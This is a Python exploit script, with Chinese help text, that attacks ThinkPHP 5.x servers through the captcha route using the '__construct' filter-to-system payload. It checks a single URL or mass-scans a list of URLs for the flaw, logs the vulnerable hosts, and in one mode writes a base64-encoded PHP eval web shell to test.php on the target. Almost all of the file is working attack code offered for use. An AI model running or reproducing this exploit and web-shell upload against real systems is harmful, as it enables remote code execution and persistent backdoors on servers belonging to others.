import requests
import argparse 
import urllib3


# 禁用警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#requests库的使用
headers = {
           "User-Agent":"Mozilla/6666.0 (Windows NT 7.0; Win32; x32; rv:107.0) Gecko/20100101 Firefox/107.0",
           "Content-Type":"application/x-www-form-urlencoded"
    }

#argparse库的使用

zhushi = argparse.ArgumentParser(description="操作说明",formatter_class=argparse.RawTextHelpFormatter,epilog='''
python .\Thinkphp5.x.py -u https://xxxxx/  (url中需要加上http://或https://)
python .\Thinkphp5.x.py -u http://xxxxx/ -e base64编码  (需要上传的代码进行base64编码)
python .\Thinkphp5.x.py -f url.txt (-f后面是txt文本路径)''')

zhushi.add_argument('-u','--url',type=str,help="url地址")
zhushi.add_argument('-e','--exp',type=str,help="上传shell")
zhushi.add_argument('-f','--file',type=str,help="文件绝对路径")


jiexi = zhushi.parse_args()

uuu = str(jiexi.url) + "/index.php?s=captcha"


if jiexi.url and not jiexi.exp:
    try:
        print("执行命令    echo+success123;")
        shuju = r"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo+success123;"
        post = requests.post(url=uuu,verify=False,headers=headers,data=shuju,timeout=3)
        xiangying = str(post.text)
        #验证是否存在success123回显
        if  'success123' in xiangying: 
                print(jiexi.url + ' 存在漏洞')
        else:
                print(jiexi.url + '  漏洞不存在')
    except:
        print(jiexi.url+ '  无法访问')


if jiexi.exp:
        #上传base64编码后的代码默认为<?php @eval($_POST['asd']);?>test
        shell = str("echo -n PD9waHAgQGV2YWwoJF9QT1NUWydhc2QnXSk7Pz50ZXN0 | base64 -d > test.php")
        shuju = r"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]="+shell
        url = str(jiexi.exp) + "/index.php?s=captcha"
        post = requests.post(url=url,verify=False,headers=headers,data=shuju,timeout=3)
        test = str(jiexi.exp+"test.php")
        get = requests.get(url=test,verify=False,timeout=3)
        if get.status_code == 200:
            print('上传shell文件    成功\n'+'shell位置 '+test)
        else:
             print("上传shell文件    失败")


if jiexi.file:
    print("执行命令    echo+success123;")
    file = jiexi.file
    file_1 = open(file)
    wj = file_1.readlines()
    for i in range(len(wj)):
        try:
            aa = (wj[i]).strip()
            aa = aa + "/index.php?s=captcha"
            shuju = r"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo+success123;"
            post = requests.post(url=aa,verify=False,headers=headers,data=shuju,timeout=3)
            xiangying = str(post.text)
            #验证是否存在success123回显
            if  'success123' in xiangying: 
                print((wj[i]).strip() + ' 存在漏洞')
                ok = open('./ok.txt','a+')
                ok.writelines((wj[i]).strip() + '\n')
                ok.close()
            else:
                print(aa + '  漏洞不存在')
        except:
            print((wj[i]).strip() + '  无法访问')
